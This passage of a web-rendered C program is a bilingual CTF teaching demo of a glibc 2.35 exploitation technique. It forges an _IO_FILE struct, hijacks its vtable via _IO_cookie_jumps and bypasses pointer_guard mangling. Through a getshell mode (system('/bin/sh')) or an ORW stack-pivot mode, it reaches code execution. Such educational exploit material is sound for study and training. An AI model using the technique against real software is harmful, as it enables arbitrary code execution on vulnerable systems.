alteration: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    fake_file_struct-&gt;_lock = (<span class="type">void</span> *) (libc_base + <span class="number">0x21ba70</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    *vtable = (<span class="type">size_t</span>)(libc_base + <span class="number">0x215b80</span> + <span class="number">0x38</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n\n&quot;</span>, *vtable);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* top_chunk_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0x108</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThrough pwndbg, we can see that the size of top chunk is at fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m通过pwndbg我们可以看到top chunk的大小保存在fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size is: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mtop chunk的大小top_chunk-&gt;size为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function sysmalloc, there is a check for page alignment of top chunk: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在函数sysmalloc中，有一个检查top chunk页对齐的代码片段: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 2617, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||\n&quot;</span></span><br><span class="line">         <span class="string">&quot;          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           prev_inuse (old_top) &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe function assert here in malloc.c is a bit different from that in other file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这个malloc.c中的assert函数与其他文件中的函数不太一样。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBecause in malloc.c there is a #define statement: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因为在malloc.c中有一个#define语句: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 292, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m# define __assert_fail(assertion, file, line, function)\t\t\t\\\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t __malloc_assert(assertion, file, line, function)\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that if the assertion in malloc.c failed, it will call function __malloc_assert.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以如果这个检查失败了，那么它就会调用__malloc_assert.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe content of function __malloc_assert is: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__malloc_assert函数的内容为: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 297, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic void\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__malloc_assert (const char *assertion, const char *file, unsigned int line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t const char *function)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  (void) __fxprintf (NULL, \&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     __progname, __progname[0] ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     file, line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     function ? function : \&quot;\&quot;, function ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     assertion);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  fflush (stderr);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  abort ();\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhile in function __fxprintf, it will utilize stderr to output something, and that is our chance.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m函数__fxprintf会利用stderr来输出错误信息，这就是我们利用的机会。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThrough forging fake _IO_FILE struct, we can turn to anywhere that can be executed.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m通过伪造_IO_FILE结构体，我们可以执行任意地址的代码。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe easiest way in CTF is turning the execution flow into one gadget.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF比赛中最简单的方法就是将执行流转到one_gadget中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut one gadgets in libc 2.35 all have many constraints, which we need to pay attention to.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但glibc 2.35版本的one gadget有很多的限制条件需要注意。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mMoreover, many problems today have sandboxes, where you cannot use the syscall EXECVE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m另外，现在的很多赛题都有沙箱，我们可能不能调用execve的系统调用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo stack pivoting may be the most common step in exploitation.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此栈迁移就是本方法利用中较为常用的手段了。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function __vxprintf_internal, which is called indirectly by __fxprintf, it will call function _IO_cookie_read: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__fxprintf函数会间接调用到__vxprintf_internal函数，后者会调用_IO_cookie_read函数: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe &#x27;r12&#x27; here is (_IO_cookie_jumps + 0x38), which is the value of *vtable we wrote in before.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的r12寄存器的值就是(_IO_cookie_jumps + 0x38), 这就是我们前面写的*vtable值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see in struct _IO_cookies_jump: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m就如_IO_cookies_jump中代码展示的这样: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 111, /libio/iofopncook.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT_DUMMY,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(finish, _IO_file_finish),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(overflow, _IO_file_overflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(underflow, _IO_file_underflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(uflow, _IO_default_uflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(pbackfail, _IO_default_pbackfail),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsputn, _IO_file_xsputn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekoff, _IO_cookie_seekoff),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekpos, _IO_default_seekpos),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(setbuf, _IO_file_setbuf),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(sync, _IO_file_sync),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(doallocate, _IO_file_doallocate),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(read, _IO_cookie_read),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(write, _IO_cookie_write),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seek, _IO_cookie_seek),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(close, _IO_cookie_close),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(stat, _IO_default_stat),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(imbue, _IO_default_imbue),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32mpoints to \033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32m指向的是\033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32mpoints to \033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32m指向的是\033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo here we let it call _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以这里我们让程序调用_IO_cookie_read函数.\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s have a look at _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m让我们看一下_IO_cookie_read函数的内容。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;_IO_cookie_read&gt;:\tendbr64 \n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+4&gt;:\tmov    rax,QWORD PTR [rdi+0xe8]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+11&gt;:\tror    rax,0x11\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+15&gt;:\txor    rax,QWORD PTR fs:0x30\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+24&gt;:\ttest   rax,rax\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+27&gt;:\tje     &lt;_IO_cookie_read+38&gt;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+29&gt;:\tmov    rdi,QWORD PTR [rdi+0xe0]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+36&gt;:\t\033[31mjmp    rax\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+38&gt;:\tmov    rax,0xffffffffffffffff\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+45&gt;:\tret\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see, it directly calls rax, and &#x27;rdi&#x27; here is actually our fake _IO_FILE_plus address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以看到，它直接call rax，这里的rdi实际上就是假的_IO_FILE_plus结构体的地址。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can write any executable address into [rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此我们可以将任意可执行的地址写入到[rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, don&#x27;t forget some instructions in the middle.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是，别忘了中间还有几条指令。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, you can see a &#x27;ror&#x27; instruction and a &#x27;xor&#x27; instruction that change the value of rax.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里你可以看到有一个ror指令和一个xor指令，这些指令会修改rax的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThat is actually a kind of protection strategy used in high versions of glibc ---- encrypting the address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这实际上是高版本glibc的一种保护方式——将地址进行简单加密。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, these two instruction is decrypting rax, first ror 11 bits, and second xor fs:0x30h, which is our \033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的这两条指令实际上是在解密rax，首先循环右移0x11位，然后异或fs:0x30h，这实际上就是\033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow you know that why we need the value of pointer_guard, it&#x27;s important for us to encrypt executable address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在你应该知道为什么我们需要修改pointer_guard的值了，它对于地址的加密过程很重要。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe encryption algorithm is easy to get: first xor pointer_guard, and second rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m加密方式很好推出来：首先异或pointer_guard，然后循环左移0x11位。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mPay attention to the instruction before &#x27;jmp rax&#x27;: mov rdi, QWORD PTR [rdi+0xe0]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意&#x27;jmp rax&#x27;之前的指令: mov rdi, QWORD PTR [rdi+0xe0]\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf there is not any sandbox, we can let rax=system() address, and [rdi+0xe0]=&#x27;/bin/sh&#x27; address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果这里没有沙箱，我们可以让rax等于system函数地址，[rdi+0xe0]等于字符串/bin/sh的地址\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mElse, you can also fill it with &#x27;pcop&#x27; to trigger stack pivoting and open, read, write flag file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m否则，我们也可以填充pcop的地址来触发栈迁移，然后打开、读、写flag文件。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35mYou chose the getshell mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35m你选择了getshell模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we&#x27;ll write &#x27;/bin/sh&#x27; address into [rdi+0xe0] and encrypted system() address into [rdi+0xe8]\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们在[rdi+0xe0]处写入字符串/bin/sh的地址，将加密后的system函数地址写入[rdi+0xe8]处。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>** sh_addr = (<span class="type">char</span>**)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of string &#x27;/bin/sh&#x27; should be written in: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m字符串&#x27;/bin/sh&#x27;的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        *sh_addr = sh;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%p\033[0m\n&quot;</span>, *sh_addr);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* system_addr = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function system() should be written in: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m函数system()的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        *system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mNow the value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们需要让这个值异或pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *system_addr ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\n\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们循环左移0x11位:\n\033[0m&quot;</span>);</span><br><span class="line">        *system_addr = (*system_addr &lt;&lt; <span class="number">0x11</span>) + (*system_addr &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou chose the orw mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你选择了orw模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mIMPORTANT: You must make sure that there is a flag file in this directory, or we&#x27;ll be unable to read.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m注意：你必须保证当前文件夹下有一个flag文件，否则该程序将无法读取。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn glibc 2.35, we usually use setcontext() function to trigger stack pivoting, but with a little difference from lower versions.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在glibc 2.35中，我们一般使用setcontext函数进行栈迁移，但与低版本的glibc的利用方式有一些小差别。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn lower version, the instruction that changes the rsp is: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在低版本glibc中，修改rsp的指令为: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe rdi here is our [fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的rdi是[fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut in glibc 2.35, the instruction was changed to: \033[31m&#x27;mov rsp, [rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是在glibc 2.35中，这条指令被修改为: \033[31m&#x27;mov rsp, [rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can&#x27;t change the value of rsp only by writing forged data in our fake _IO_FILE_plus struct.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们不能仅通过将假的数据写入到假的_IO_FILE_plus结构体而修改rsp的值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, we still have our way to exploit. It&#x27;s called pcop, which is just a unique gadget.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但我们依然能够进行漏洞利用，需要一个pcop，这是一个特殊的gadget。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTry to use this command below in the terminal: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以尝试在终端运行以下命令：: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;34mobjdump -d /lib/x86_64-linux-gnu/libc.so.6 -M intel | grep &#x27;1675b&#x27;\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou can see a gadget in offset \033[31m0x1675b0\033[32m: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你可以在偏移\033[31m0x1675b0\033[32m处看到有一个gadget: \033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  1675b0:       48 8b 57 08             mov    rdx,QWORD PTR [rdi+0x8]\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b4:       48 89 04 24             mov    QWORD PTR [rsp],rax\n&quot;</span></span><br><span class="line">             <span class="string">&quot;  1675b8:       ff 52 20                call   QWORD PTR [rdx+0x20]\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt seems that we can use the value of [rdi+0x8] to change rdx to any value as we like.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们似乎可以使用[rdi+0x8]的值去修改rdx的值为任意值。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAnd then we can change the rip into [rdx+0x20].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们就可以将rip修改到[rdx+0x20]。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can change rdx to a place that we can control, then write setcontext() address in it to trigger stack pivoting.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以将rdx修改到一个我们可以控制的地方，然后将setcontext函数的地址写进去来触发栈迁移。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo keep the environment of heap, we use a space in bss segment to complete this process.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m为了保持堆环境，我们使用bss段的一块空间来完成这个过程。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss space is: \033[31m%p\033[32m.\033[0m\n&quot;</span>, &amp;space);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mbss对应地址为: \033[31m%p\033[32m.\033[0m\n\n&quot;</span>, &amp;space);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe let [rdi+0xe0] = bss address, [rdi+0xe8] = pcop address.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们让[rdi+0xe0] = bss的地址, [rdi+0xe8] = pcop的地址.\033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span>* bss_address = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of bss should be written in: \033[31m%p\n\033[0m&quot;</span>, bss_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span 